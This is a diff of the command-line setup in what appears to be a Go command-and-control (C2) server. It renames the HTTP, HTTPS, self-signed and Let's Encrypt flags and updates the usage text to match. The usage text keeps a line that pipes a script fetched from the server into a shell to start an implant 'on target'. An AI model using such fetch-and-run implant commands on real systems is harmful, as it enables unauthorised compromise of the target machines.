@@ -69,12 +69,12 @@ func main() {
 			"Print the implant template to stdout and exit",
 		)
 		httpAddr = flag.String(
-			"http",
+			"http-address",
 			DefaultHTTPAddr,
 			"HTTP listen `address` (with -server)",
 		)
 		httpsAddr = flag.String(
-			"https",
+			"https-address",
 			DefaultHTTPSAddr,
 			"HTTPS listen `address` (with -server)",
 		)
@@ -102,7 +102,7 @@ func main() {
 			"(with -server)",
 	)
 	flag.Func(
-		"self-signed",
+		"selfsigned-domain",
 		"TLS `domain` for which to serve a self-signed certificate "+
 			"(with -server, may be repeated)",
 		func(d string) error {
@@ -113,7 +113,7 @@ func main() {
 		},
 	)
 	flag.Func(
-		"letsencrypt",
+		"letsencrypt-domain",
 		"Let's Encrypt-provisioned TLS `domain` (with -server, "+
 			"may be repeated)",
 		func(d string) error {
@@ -130,9 +130,9 @@ func main() {
 
 Really simple HTTP-based C2 server.
 
-If an HTTPS address is set (-https) but no domains are whitelisted
-(-letsencrypt and -self-signed), a self-signed certificate will be use for all
-HTTPS requests.
+If an HTTPS address is set (-https-address) but no domains are whitelisted
+(-letsencrypt-domain and -selfsigned-domain), a self-signed certificate will be
+used for all HTTPS requests.
 
 In normal usage, one instance of this program is started as a persistent
 server with -server, and then further instances of this program are started to
@@ -141,7 +141,7 @@ allow operators to connect to it.
 Typical usage is something like:
 
 # Start a server to handle comms from implants
-nohup %s -server -letsencrypt example.com >/dev/null 2>&1 &
+nohup %s -server -letsencrypt-domain example.com >/dev/null 2>&1 &
 
 # Start an implant going, on target
 curl -sv https://example.com/c | sh
